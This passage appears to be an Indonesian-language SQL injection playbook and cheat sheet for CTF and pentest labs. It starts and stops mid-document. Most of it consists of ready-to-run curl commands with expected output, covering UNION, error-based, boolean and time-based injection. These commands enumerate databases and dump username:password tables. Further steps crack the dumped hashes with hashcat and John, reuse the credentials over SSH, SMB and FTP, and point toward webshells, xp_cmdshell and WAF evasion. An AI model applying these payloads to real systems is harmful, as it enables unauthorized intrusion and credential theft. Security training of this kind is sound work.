     │    ├── information_schema
     │    └── INTO OUTFILE
     │
     ├── PostgreSQL
     │    ├── current_database()
     │    ├── pg_sleep()
     │    ├── information_schema / pg_catalog
     │    └── COPY ... PROGRAM (privileged)
     │
     ├── MSSQL
     │    ├── DB_NAME()
     │    ├── WAITFOR DELAY
     │    ├── sys.tables
     │    └── xp_cmdshell
     │
     ├── Oracle
     │    ├── USER
     │    ├── v$version
     │    ├── all_tables
     │    └── DBMS_* primitives
     │
     └── SQLite
          ├── sqlite_version()
          ├── sqlite_master
          └── limited server-side execution primitives
```

---

## UNION Decision Tree

```text
UNION Candidate
     │
     ▼
ORDER BY
     │
     ├── 1 ✅
     ├── 2 ✅
     ├── 3 ✅
     └── 4 ❌
          │
          ▼
     Columns = 3
          │
          ▼
UNION SELECT NULL,NULL,NULL
          │
          ▼
Replace NULL
          │
          ▼
'A','B','C'
          │
          ▼
Find visible column
          │
          ▼
Database Name
          │
          ▼
Table Names
          │
          ▼
Column Names
          │
          ▼
Target Data
```

---

# 🛠️ 16. Common Errors & Troubleshooting

|Error|Sebab|Solusi|
|---|---|---|
|sqlmap tidak detect|Parameter tidak injectable|Validasi manual dengan quote/boolean terlebih dahulu|
|sqlmap tidak detect tetapi manual berhasil|WAF/CSRF/request complexity|Gunakan `-r request.txt`, cookie, header, atau parameter yang tepat|
|UNION menghasilkan error|Jumlah kolom salah|Gunakan `ORDER BY` atau `NULL` method|
|UNION berhasil tetapi data tidak terlihat|Column tidak displayable|Test `'A','B','C'` untuk menemukan output column|
|Single quote menghasilkan 500|Bisa SQL error|Inspect response body dan headers|
|Tidak ada SQL error|Error handling disembunyikan|Coba Boolean Blind|
|Boolean TRUE/FALSE sama|Wrong syntax/context|Coba numeric/string context yang sesuai|
|Time-based tidak delay|Wrong DB syntax|Identifikasi DB lalu pakai sleep function yang benar|
|Time-based terlalu lambat|Jaringan/WAF/server latency|Gunakan baseline dan threshold yang lebih konservatif|
|False positive|Response memang berubah karena parameter|Bandingkan beberapa baseline|
|WAF blocking|Signature match|Identify exact blocking pattern; gunakan encoding/tamper yang relevan, bukan random|
|`space2comment` membuat query gagal|DB/parser tidak cocok|Hapus tamper atau gunakan tamper lain|
|Permission denied `INTO OUTFILE`|Tidak punya FILE privilege|Check privileges/`secure_file_priv`|
|Webshell tidak dapat diakses|Wrong directory / web root|Identifikasi document root dan write permission|
|`xp_cmdshell` disabled|Feature disabled|Cek privilege dan configuration pada lab|
|`COPY ... PROGRAM` gagal|Tidak superuser/privilege tidak cukup|Check PostgreSQL role privileges|
|`ORDER BY` tidak memberi perbedaan|Endpoint tidak benar atau query context berbeda|Gunakan `UNION SELECT NULL` method|
|`--` tidak bekerja|Comment syntax/spacing salah|Sesuaikan comment syntax dengan DB|
|MySQL `#` tidak bekerja|Context/encoding berbeda|Gunakan `-- -` atau syntax comment yang sesuai|
|SQLMap terlalu banyak request|Level/risk tinggi|Mulai `--level=1 --risk=1`|
|SQLMap dump kosong|Table/column salah atau data kosong|Enumerate tables/columns ulang|
|JSON injection tidak bekerja|Backend bukan string-concatenation / prepared query|Inspect request and backend clues|
|Cookie injection tidak bekerja|Cookie tidak dipakai dalam SQL|Cari parameter/sink lain|
|Header injection tidak bekerja|Header hanya dipakai oleh proxy/webserver|Cari server-side logging/query sink|
|Double encoding tidak berhasil|App hanya decode sekali|Jangan gunakan tanpa bukti multiple decoding|
|NoSQL payload ditolak|Backend melakukan schema validation|Inspect expected JSON type dan endpoint logic|

---

# 🧠 SQL Injection Muscle Memory

Saat menemukan parameter, biasakan urutan berikut:

```text
1. Identify parameter
       ↓
2. Baseline response
       ↓
3. Single quote
       ↓
4. Identify DB clues
       ↓
5. Identify context
       ↓
6. TRUE / FALSE test
       ↓
7. Determine technique
       │
       ├── UNION
       ├── Error-Based
       ├── Boolean Blind
       └── Time-Based
       ↓
8. Enumerate
       ↓
9. Extract only needed data
       ↓
10. Check privilege
       ↓
11. Assess post-exploitation path
```

---

# ✅ Final SQLi Checklist

```text
[ ] Parameter identified
[ ] Baseline response recorded
[ ] Single quote tested
[ ] Error behavior checked
[ ] Boolean TRUE/FALSE tested
[ ] Time delay tested when appropriate
[ ] DBMS identified
[ ] Injection context identified
[ ] UNION candidate confirmed
[ ] Column count determined
[ ] Displayable columns found
[ ] Database name extracted
[ ] Table names extracted
[ ] Column names extracted
[ ] Required data extracted
[ ] Boolean Blind understood
[ ] Time-Based understood
[ ] SQLMap validated manually
[ ] WAF identified if present
[ ] Tamper used only when justified
[ ] DB privilege checked before RCE/file primitives
[ ] Evidence documented
```

---

# 🎯 Quick CTF Recipe — UNION SQLi

```text
URL:
http://TARGET/item?id=10
```

### 1. Test

```bash
curl -G --data-urlencode "id=10'" http://TARGET/item
```

### 2. Find columns

```bash
curl -G --data-urlencode "id=10 ORDER BY 1" http://TARGET/item
curl -G --data-urlencode "id=10 ORDER BY 2" http://TARGET/item
curl -G --data-urlencode "id=10 ORDER BY 3" http://TARGET/item
curl -G --data-urlencode "id=10 ORDER BY 4" http://TARGET/item
```

### 3. UNION

```bash
curl -G \
--data-urlencode "id=10 UNION SELECT NULL,NULL,NULL-- -" \
http://TARGET/item
```

### 4. Find visible columns

```bash
curl -G \
--data-urlencode "id=10 UNION SELECT 'A','B','C'-- -" \
http://TARGET/item
```

### 5. Database name — MySQL

```bash
curl -G \
--data-urlencode "id=10 UNION SELECT database(),'B','C'-- -" \
http://TARGET/item
```

### 6. Tables

```bash
curl -G \
--data-urlencode \
"id=10 UNION SELECT GROUP_CONCAT(table_name),'B','C' FROM information_schema.tables WHERE table_schema=database()-- -" \
http://TARGET/item
```

### 7. Columns

```bash
curl -G \
--data-urlencode \
"id=10 UNION SELECT GROUP_CONCAT(column_name),'B','C' FROM information_schema.columns WHERE table_name='users'-- -" \
http://TARGET/item
```

### 8. Data

```bash
curl -G \
--data-urlencode \
"id=10 UNION SELECT GROUP_CONCAT(username,':',password),'B','C' FROM users-- -" \
http://TARGET/item
```

---

# ⬇️ Post-SQLi: Setelah Dapat Data

Setelah berhasil melakukan ekstraksi data kredensial (misalnya pasangan `username:password` atau data sensitif lainnya), ikuti tahapan tindak lanjut sistematis berikut untuk melanjutkan ke tahap *system access* di CTF / pentest:

### Skenario 1: Password Plaintext Didapatkan
Jika password tersimpan tanpa enkripsi/hashing:
1. **Login Web Admin:** Coba login ke panel administrasi target (`/admin/`, `/login/`, `/dashboard/`).
2. **Credential Reuse ke Service Lain:**
   - **SSH (Port 22):** `ssh username@TARGET`
   - **FTP (Port 21):** `ftp TARGET`
   - **Database (Port 3306 / 5432 / 1433):** `mysql -u username -p -h TARGET`
   - **SMB (Port 445):** `crackmapexec smb TARGET -u username -p password`

### Skenario 2: Password Hash Didapatkan
Jika password yang diekstrak berupa nilai hash:
1. **Identifikasi Jenis Hash:**
   ```bash
   # Gunakan hashid atau hash-identifier di Parrot OS:
   hashid '$2y$10$abcdefghijklmnopqrstuv'
   # atau:
   hash-identifier
   ```
2. **Offline Hash Cracking Menggunakan Hashcat:**
   ```bash
   # MD5 (Mode 0):
   hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

   # SHA-1 (Mode 100):
   hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

   # SHA-256 (Mode 1400):
   hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt

   # SHA-512 Crypt / Linux Shadow (Mode 1800):
   hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt

   # Bcrypt (Mode 3200):
   hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
   ```
3. **Alternatif Cracking via John the Ripper:**
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   ```

### Skenario 3: Kredensial & Artefak Lain Ditemukan
- **Email Pengguna:** Uji fitur reset password untuk *Password Reset Token Poisoning* (lihat `[🔐 18 — Authentication Bypass Workflow](/docs/authentication-bypass)`).
- **API Keys / JWT Secrets:** Eksekusi authenticated REST endpoints atau buat JWT admin dengan secret yang didapat.
- **Private Key (id_rsa):** Simpan string key ke file lokal, set permission `chmod 600 id_rsa`, dan login:
  ```bash
  ssh -i id_rsa username@TARGET
  ```

---

# [💉 19 — SQL Injection Workflow](/docs/sql-injection) — Complete Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"          # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"
export TARGET_URL="http://$TARGET"
mkdir -p ~/sqli_loot/{dumps,hashes,shells,requests}
cd ~/sqli_loot

echo "[*] Target: $TARGET | URL: $TARGET_URL"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | URL: http://10.10.11.200
```

---

## ═══════════════════════════════════════

## FASE 0: RECONNAISSANCE — TEMUKAN PARAMETER

## ═══════════════════════════════════════

> **Tujuan:** Sebelum inject apapun, kita perlu tahu dimana parameter berada.

### Langkah 0.1 — Identifikasi Entry Points

Bash

```
# Command 1: Cek teknologi web (kasih petunjuk DB yang mungkin dipakai)
curl -s -I $TARGET_URL | head -20

# Command 2: Lihat semua link dan form di halaman utama
curl -s $TARGET_URL | grep -oP '(href|action|src)="[^"]*"' | sort -u

# Command 3: Cari parameter di URL
curl -s $TARGET_URL | grep -oP '\?[a-zA-Z_]+=[^"&\s]*'
```

**OUTPUT BERHASIL ✅ — Ketemu parameter di URL:**

text

```
?id=10
?category=1
?user=admin
?search=test
?page=2
```

➡️ Catat semua parameter yang ditemukan. Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — Ada form POST:**

HTML

```
<form action="/login" method="POST">
<input name="username" type="text">
<input name="password" type="password">
```

➡️ Catat endpoint dan parameter form. Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — Header kasih info teknologi:**

text

```
X-Powered-By: PHP/8.1.0
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: PHPSESSID=abc123
```

**Interpretasi header untuk menebak DB:**

|Header/Teknologi|DB yang Mungkin|
|---|---|
|PHP + Apache/Nginx|MySQL/MariaDB (paling umum)|
|ASP.NET / IIS|MSSQL|
|Java / Spring|MySQL, PostgreSQL, Oracle|
|Python / Flask/Django|PostgreSQL, SQLite, MySQL|
|Ruby on Rails|PostgreSQL, SQLite|
|Node.js|MongoDB (NoSQL!), MySQL, PostgreSQL|

Bash

```
# Command 4: Simpan parameter yang ditemukan
export PARAM="id"              # Ganti sesuai yang ditemukan
export PARAM_VALUE="10"        # Nilai normal parameter
export INJECT_URL="$TARGET_URL/item?$PARAM=$PARAM_VALUE"
echo "[*] Target parameter: $PARAM=$PARAM_VALUE"
echo "[*] Inject URL: $INJECT_URL"
```

---

### Langkah 0.2 — Ambil Baseline Response

Bash

```
# Command 1: Ambil response normal dan simpan
curl -s "$INJECT_URL" -o ~/sqli_loot/baseline.html
wc -c ~/sqli_loot/baseline.html

# Command 2: Lihat isi response untuk cari marker unik
curl -s "$INJECT_URL" | grep -oP '<title>[^<]*</title>'
curl -s "$INJECT_URL" | grep -oP 'class="[^"]*product[^"]*"' | head -5

# Command 3: Catat HTTP status code
curl -s -o /dev/null -w "HTTP Status: %{http_code}\nResponse Size: %{size_download}\n" "$INJECT_URL"
```

**OUTPUT BERHASIL ✅:**

text

```
HTTP Status: 200
Response Size: 14820
```

➡️ **SIMPAN INFO INI:**

Bash

```
export BASELINE_SIZE=14820
export TRUE_MARKER="Product Name"    # Teks yang SELALU ada di response normal
```

**OUTPUT GAGAL ❌ — 404 Not Found:**

text

```
HTTP Status: 404
```

➡️ URL salah. Coba variasi:

Bash

```
# Coba endpoint lain
curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/products?id=1"
curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/shop/item?id=1"
curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/view?id=1"
```

---

## ═══════════════════════════════════════

## FASE 1: DETECTION — KONFIRMASI SQL INJECTION

## ═══════════════════════════════════════

> **Tujuan:** Buktikan ada SQLi sebelum lanjut. Jangan skip fase ini.

### Langkah 1.1 — Single Quote Test (Test Paling Basic)

Bash

```
# Command 1: Inject single quote - yang paling sering memicu error
curl -s -o ~/sqli_loot/quote_test.html \
    -w "HTTP: %{http_code} | Size: %{size_download}\n" \
    --get --data-urlencode "$PARAM=10'" \
    "$TARGET_URL/item"

# Command 2: Cek apakah ada SQL error di response
grep -iE "(sql syntax|mysql|mariadb|postgresql|pgsql|sql server|oracle|sqlite|syntax error|pdoexception|warning.*mysql|unclosed quotation)" \
    ~/sqli_loot/quote_test.html

# Command 3: Double quote test (untuk beberapa konteks)
curl -s --get --data-urlencode "$PARAM=10\"" "$TARGET_URL/item" | \
    grep -iE "(sql|error|syntax|warning)" | head -5
```

**OUTPUT BERHASIL ✅ — SQL Error MySQL terlihat:**

text

```
You have an error in your SQL syntax; check the manual that corresponds to your 
MySQL server version for the right syntax to use near ''' at line 1
```

➡️ **JACKPOT! SQLi terkonfirmasi! Database = MySQL/MariaDB**

Bash

```
export DB_TYPE="MySQL"
echo "[+] SQL Injection CONFIRMED! DB Type: $DB_TYPE"
```

➡️ Lanjut ke **Langkah 1.3 (Identify Context)**

**OUTPUT BERHASIL ✅ — SQL Error PostgreSQL:**

text

```
ERROR: syntax error at or near "'" at character 15
```

➡️ Database = PostgreSQL

Bash

```
export DB_TYPE="PostgreSQL"
```

**OUTPUT BERHASIL ✅ — SQL Error MSSQL:**

text

```
Unclosed quotation mark after the character string ''.
Microsoft SQL Server
```

➡️ Database = MSSQL

Bash

```
export DB_TYPE="MSSQL"
```

**OUTPUT BERHASIL ✅ — SQL Error SQLite:**

text

```
near "'": syntax error
SQLiteException
```

➡️ Database = SQLite

Bash

```
export DB_TYPE="SQLite"
```

**OUTPUT BERBEDA ❌ — Generic error (500), tidak ada SQL error spesifik:**

text

```
HTTP: 500 | Size: 421
Internal Server Error
Something went wrong
```

➡️ Mungkin ada SQLi tapi error disembunyikan. Coba Boolean test:

Bash

```
# Bandingkan size response TRUE vs FALSE
curl -s -o ~/sqli_loot/true_test.html --get \
    --data-urlencode "$PARAM=10 AND 1=1" "$TARGET_URL/item"
curl -s -o ~/sqli_loot/false_test.html --get \
    --data-urlencode "$PARAM=10 AND 1=2" "$TARGET_URL/item"

wc -c ~/sqli_loot/baseline.html ~/sqli_loot/true_test.html ~/sqli_loot/false_test.html
```

**OUTPUT ✅ — Size berbeda antara TRUE dan FALSE:**

text

```
14820  baseline.html
14820  true_test.html
  421  false_test.html
```

➡️ **Boolean Blind SQLi terkonfirmasi!** Lanjut ke **Fase 4 (Boolean Blind)**

**OUTPUT ❌ — Tidak ada perbedaan sama sekali:**

text

```
14820  baseline.html
14820  true_test.html
14820  false_test.html
```

➡️ Coba time-based:

Bash

```
# Time-based test — MySQL
time curl -s -o /dev/null --get \
    --data-urlencode "$PARAM=10 AND SLEEP(5)" "$TARGET_URL/item"
```

**OUTPUT ✅ — Ada delay ~5 detik:**

text

```
real    0m5.123s
```

➡️ **Time-Based Blind SQLi! DB = MySQL**. Lanjut ke **Fase 5 (Time-Based Blind)**

**OUTPUT ❌ — Tidak ada delay:**

text

```
real    0m0.115s
```

➡️ Coba konteks berbeda atau parameter lain:

Bash

```
# Coba numeric context tanpa quote
curl -s --get --data-urlencode "$PARAM=10 OR 1=1" "$TARGET_URL/item"

# Coba parameter lain yang belum dicoba
# Cek cookies juga
curl -s "$TARGET_URL/profile" -H "Cookie: session=test'" | grep -iE "(sql|error|syntax)"
```

---

### Langkah 1.2 — Identifikasi Tipe Database (Jika Belum Tahu)

Bash

```
# Test semua DB sekaligus dengan fingerprinting via komentar
# MySQL: -- - atau #
curl -s --get --data-urlencode "$PARAM=10-- -" "$TARGET_URL/item" -o test_mysql.html
curl -s --get --data-urlencode "$PARAM=10#" "$TARGET_URL/item" -o test_mysql2.html

# MSSQL: --
curl -s --get --data-urlencode "$PARAM=10--" "$TARGET_URL/item" -o test_mssql.html

# Fingerprinting via version functions (pakai di UNION setelah confirm column count)
# MySQL:    @@version
# MSSQL:    @@VERSION  
# PgSQL:    version()
# SQLite:   sqlite_version()
# Oracle:   banner FROM v$version

# Paling cepat: cek error message dari setiap DB
wc -c test_mysql.html test_mysql2.html test_mssql.html
diff ~/sqli_loot/baseline.html test_mysql.html | head -5
```

**OUTPUT BERHASIL ✅ — test_mysql.html sama dengan baseline:**

text

```
14820  baseline.html
14820  test_mysql.html   ← Komentar MySQL berhasil memotong sisa query!
```

➡️ DB kemungkinan MySQL. Comment `-- -` bekerja.

---

### Langkah 1.3 — Identifikasi Injection Context

Bash

```
# Test 1: String context (ada quotes di query)
curl -s --get --data-urlencode "$PARAM=10' AND '1'='1" "$TARGET_URL/item" | wc -c
curl -s --get --data-urlencode "$PARAM=10' AND '1'='2" "$TARGET_URL/item" | wc -c

# Test 2: Numeric context (tanpa quotes di query)
curl -s --get --data-urlencode "$PARAM=10 AND 1=1" "$TARGET_URL/item" | wc -c
curl -s --get --data-urlencode "$PARAM=10 AND 1=2" "$TARGET_URL/item" | wc -c

# Test 3: Coba tutup parenthesis (jika ada subquery)
curl -s --get --data-urlencode "$PARAM=10) AND (1=1" "$TARGET_URL/item" | wc -c
```

**OUTPUT ✅ — Numeric context bekerja (ukuran berbeda):**

text

```
14820   ← AND 1=1 (TRUE)
421     ← AND 1=2 (FALSE)
```

➡️ **Numeric injection context!** Query backend: `WHERE id=INPUT`

**OUTPUT ✅ — String context bekerja:**

text

```
14820   ← AND '1'='1 (TRUE)
421     ← AND '1'='2 (FALSE)
```

➡️ **String injection context!** Query backend: `WHERE name='INPUT'`

Bash

```
# Simpan context yang bekerja
export INJECT_CONTEXT="numeric"   # atau "string"
echo "[*] Injection context: $INJECT_CONTEXT"
```

---

## ═══════════════════════════════════════

## FASE 2: CLASSIC / UNION SQL INJECTION

## ═══════════════════════════════════════

> **Masuk sini jika:** Response menampilkan data langsung (In-Band SQLi)

### Langkah 2.1 — Tentukan Jumlah Kolom (ORDER BY Method)

Bash

```
# Method 1: ORDER BY — tambah angka sampai error
for i in 1 2 3 4 5 6 7 8 9 10; do
    SIZE=$(curl -s -o /dev/null -w "%{size_download}" \
        --get --data-urlencode "$PARAM=10 ORDER BY $i-- -" "$TARGET_URL/item")
    echo "ORDER BY $i → Size: $SIZE"
done
```

**OUTPUT BERHASIL ✅ — Error pada kolom tertentu:**

text

```
ORDER BY 1 → Size: 14820
ORDER BY 2 → Size: 14820
ORDER BY 3 → Size: 14820
ORDER BY 4 → Size: 421    ← ERROR! Berarti ada 3 kolom
```

Bash

```
export COL_COUNT=3
echo "[+] Column count: $COL_COUNT"
```

➡️ Lanjut ke **Langkah 2.2**

**OUTPUT BERHASIL ✅ — Semua ORDER BY tidak error:**

Bash

```
# Coba NULL method sebagai alternatif
curl -s --get --data-urlencode "$PARAM=10 UNION SELECT NULL-- -" "$TARGET_URL/item" | wc -c
curl -s --get --data-urlencode "$PARAM=10 UNION SELECT NULL,NULL-- -" "$TARGET_URL/item" | wc -c
curl -s --get --data-urlencode "$PARAM=10 UNION SELECT NULL,NULL,NULL-- -" "$TARGET_URL/item" | wc -c
```

**OUTPUT NULL Method ✅:**

text

```
421     ← 1 NULL → error
421     ← 2 NULL → error  
14820   ← 3 NULL → SUCCESS! 3 kolom
```

**OUTPUT GAGAL ❌ — ORDER BY langsung error bahkan di angka 1:**

text

```
ORDER BY 1 → Size: 421
```

➡️ Mungkin komentar `-- -` tidak bekerja. Coba:

Bash

```
# Coba komentar style lain
curl -s --get --data-urlencode "$PARAM=10 ORDER BY 1#" "$TARGET_URL/item" | wc -c
curl -s --get --data-urlencode "$PARAM=10 ORDER BY 1/*" "$TARGET_URL/item" | wc -c

# Untuk Oracle: wajib ada FROM DUAL
curl -s --get --data-urlencode "$PARAM=10 ORDER BY 1 FROM DUAL--" "$TARGET_URL/item" | wc -c
```

---

### Langkah 2.2 — Temukan Kolom yang Displayable

Bash

```
# Ganti NULL dengan string 'A','B','C' sesuai jumlah kolom
# Contoh untuk 3 kolom:
curl -s --get \
    --data-urlencode "$PARAM=10 UNION SELECT 'INJECT_A','INJECT_B','INJECT_C'-- -" \
    "$TARGET_URL/item"
```

**OUTPUT BERHASIL ✅ — Terlihat string inject di response:**

HTML

```
<div class="product-name">INJECT_A</div>
<div class="description">INJECT_B</div>
<div class="price">INJECT_C</div>
```

➡️ Semua 3 kolom displayable!

Bash

```
export DISPLAY_COL=1    # Kolom yang akan dipakai untuk output data
```

**OUTPUT ✅ — Hanya beberapa kolom yang muncul:**

HTML

```
<div class="product-name">INJECT_A</div>
<!-- B dan C tidak muncul di page -->
```

➡️ Hanya kolom 1 yang displayable. Gunakan kolom 1 untuk inject data.

**OUTPUT GAGAL ❌ — Tidak ada string yang muncul meski size bertambah:**

Bash

```
# Coba dengan ID yang TIDAK ada agar row asli tidak menutupi inject
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT 'INJECT_A','INJECT_B','INJECT_C'-- -" \
    "$TARGET_URL/item"
# Pakai id=0 atau id=99999 (yang tidak exist) supaya hanya row inject yang tampil
```

---

### Langkah 2.3 — Ekstrak Informasi Database

Bash

```
# STEP 1: Versi dan nama database (sesuaikan dengan DB type)
# MySQL:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT @@version,database(),user()-- -" \
    "$TARGET_URL/item"

# PostgreSQL:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT version(),current_database(),current_user-- -" \
    "$TARGET_URL/item"

# MSSQL:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT @@VERSION,DB_NAME(),SYSTEM_USER-- -" \
    "$TARGET_URL/item"

# SQLite:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT sqlite_version(),'n/a','n/a'-- -" \
    "$TARGET_URL/item"
```

**OUTPUT BERHASIL ✅ — MySQL:**

HTML

```
<div class="product-name">8.0.32-MySQL Community Server</div>
<div class="description">shopdb</div>
<div class="price">root@localhost</div>
```

Bash

```
export DB_VERSION="8.0.32"
export DB_NAME="shopdb"
export DB_USER="root@localhost"
echo "[+] DB: $DB_NAME | Version: $DB_VERSION | User: $DB_USER"

# PENTING: Jika user = root → bisa coba FILE privilege nanti!
```

---

### Langkah 2.4 — Ekstrak Nama Tabel

Bash

```
# MySQL/MariaDB:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(table_name SEPARATOR ', '),'B','C' FROM information_schema.tables WHERE table_schema=database()-- -" \
    "$TARGET_URL/item"

# PostgreSQL:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT string_agg(table_name,', '),'B','C' FROM information_schema.tables WHERE table_schema='public'-- -" \
    "$TARGET_URL/item"

# MSSQL:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT STRING_AGG(name,', '),'B','C' FROM sys.tables-- -" \
    "$TARGET_URL/item"

# SQLite - BERBEDA! Tidak ada information_schema
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT group_concat(name),'B','C' FROM sqlite_master WHERE type='table'-- -" \
    "$TARGET_URL/item"
```

**OUTPUT BERHASIL ✅:**

HTML

```
<div class="product-name">users, products, orders, sessions</div>
```

Bash

```
# Target jelas: tabel 'users'!
export TARGET_TABLE="users"
echo "[+] Tables found! Target: $TARGET_TABLE"
```

**OUTPUT GAGAL ❌ — GROUP_CONCAT terpotong (data terlalu panjang):**

HTML

```
<div class="product-name">users,products,orders,sessions,logs,audit,config,api_ke</div>
```

➡️ Gunakan LIMIT untuk ambil per baris:

Bash

```
# Ambil tabel satu per satu
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT table_name,'B','C' FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- -" \
    "$TARGET_URL/item"

curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT table_name,'B','C' FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1-- -" \
    "$TARGET_URL/item"
```

---

### Langkah 2.5 — Ekstrak Nama Kolom

Bash

```
# MySQL - cari kolom di tabel users:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(column_name SEPARATOR ', '),'B','C' FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -" \
    "$TARGET_URL/item"

# PostgreSQL:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT string_agg(column_name,', '),'B','C' FROM information_schema.columns WHERE table_name='users'-- -" \
    "$TARGET_URL/item"

# SQLite - baca schema langsung:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT sql,'B','C' FROM sqlite_master WHERE type='table' AND name='users'-- -" \
    "$TARGET_URL/item"
```

**OUTPUT BERHASIL ✅:**

HTML

```
<div class="product-name">id, username, password, email, is_admin</div>
```

Bash

```
export TARGET_COLS="username,password"
echo "[+] Columns found: id, username, password, email, is_admin"
```

---

### Langkah 2.6 — Ekstrak Data (THE GOAL!)

Bash

```
# MySQL - dump semua username dan password:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),'B','C' FROM users-- -" \
    "$TARGET_URL/item"

# 0x3a = ':' (separator antara user:pass)
# 0x0a = newline (separator antar baris)

# Alternatif lebih readable:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(username,':',password),'B','C' FROM users-- -" \
    "$TARGET_URL/item"

# SQLite:
curl -s --get \
    --data-urlencode "$PARAM=0 UNION SELECT group_concat(username||':'||password),'B','C' FROM users-- -" \
    "$TARGET_URL/item"
```

**OUTPUT BERHASIL ✅ — Credential dump:**

HTML

```
<div class="product-name">admin:5f4dcc3b5aa765d61d8327deb882cf99,john:482c811da5d5b4bc6d497ffa98491e38</div>
```

Bash

```
# Simpan ke file
echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" > ~/sqli_loot/hashes/dump.txt
echo "john:482c811da5d5b4bc6d497ffa98491e38" >> ~/sqli_loot/hashes/dump.txt

cat ~/sqli_loot/hashes/dump.txt
echo "[+] Credentials saved to ~/sqli_loot/hashes/dump.txt"

# Identifikasi tipe hash
hashid 5f4dcc3b5aa765d61d8327deb882cf99
```

**OUTPUT hashid ✅:**

text

```
Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
[+] MD2
[+] MD5          ← Paling mungkin ini!
[+] MD4
```

➡️ Crack hash! Ke **Langkah 2.7**

---

### Langkah 2.7 — Crack Hash

Bash

```
# Ekstrak hanya hash (tanpa username)
cut -d: -f2 ~/sqli_loot/hashes/dump.txt > ~/sqli_loot/hashes/hashes_only.txt

# MD5 (mode 0):
hashcat -m 0 ~/sqli_loot/hashes/hashes_only.txt /usr/share/wordlists/rockyou.txt \
    -o ~/sqli_loot/hashes/cracked.txt --force

# MD5 dengan rules (jika gagal biasa):
hashcat -m 0 ~/sqli_loot/hashes/hashes_only.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule --force

# Bcrypt (mode 3200) - lebih lambat:
hashcat -m 3200 ~/sqli_loot/hashes/hashes_only.txt /usr/share/wordlists/rockyou.txt --force

# Lihat hasil crack:
cat ~/sqli_loot/hashes/cracked.txt
```

**OUTPUT BERHASIL ✅:**

text

```
5f4dcc3b5aa765d61d8327deb882cf99:password
482c811da5d5b4bc6d497ffa98491e38:john123
```

Bash

```
export ADMIN_USER="admin"
export ADMIN_PASS="password"
echo "[+] Cracked: $ADMIN_USER:$ADMIN_PASS"
```

**OUTPUT GAGAL ❌ — Hash tidak terpecahkan:**

text

```
Session..........: hashcat
Status...........: Exhausted
```

➡️ Coba strategi lain:

Bash

```
# Online hash lookup (jika lab mengizinkan internet)
# Search: https://hashes.com/en/decrypt/hash
# Search: https://crackstation.net/

# Atau coba wordlist lebih besar
hashcat -m 0 ~/sqli_loot/hashes/hashes_only.txt \
    /usr/share/seclists/Passwords/darkweb2017-top10000.txt --force

# Atau coba john dengan rules agresif
john --wordlist=/usr/share/wordlists/rockyou.txt \
    --rules=KoreLogic ~/sqli_loot/hashes/hashes_only.txt
```

---

## ═══════════════════════════════════════

## FASE 3: ERROR-BASED SQL INJECTION

## ═══════════════════════════════════════

> **Masuk sini jika:** Ada SQL error yang muncul di response, tapi UNION tidak bekerja

### Langkah 3.1 — MySQL Error-Based (ExtractValue)

Bash

```
# ExtractValue - paling reliable di MySQL
curl -s --get \
    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -" \
    "$TARGET_URL/item"
```

**OUTPUT BERHASIL ✅:**

text

```
XPATH syntax error: '~shopdb~'
```

Bash

```
# Sekarang ekstrak tabel
curl -s --get \
    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -" \
    "$TARGET_URL/item"

# Output:
# XPATH syntax error: '~users,products,orders~'

# Ekstrak kolom dari tabel users
curl -s --get \
    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))-- -" \
    "$TARGET_URL/item"

# Dump credentials (pakai LIMIT karena ada batasan panjang ~32 char)
curl -s --get \
